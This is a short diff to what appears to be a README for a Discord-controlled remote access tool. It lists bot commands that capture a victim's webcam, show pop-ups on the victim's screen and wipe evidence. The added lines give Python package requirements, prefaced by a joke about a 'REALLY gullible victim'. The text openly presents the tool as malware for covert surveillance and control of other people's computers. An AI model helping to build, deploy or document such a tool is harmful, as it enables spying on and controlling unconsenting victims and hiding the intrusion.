@@ -7,3 +7,12 @@ Here is all the commands
 .webcam - take a screenshot of the users webcam
 .popup<message> make a pop up on the users screen
 .implode - remove evidince of everything
+Here is the requirements
+(if you have a REALLY gullible victim then)
+pip install discord.py
+pip install opencv-python
+pip install pillow
+pip install pyautogui
+pip install pygetwindow
+pip install pycaw
+pip install numpy
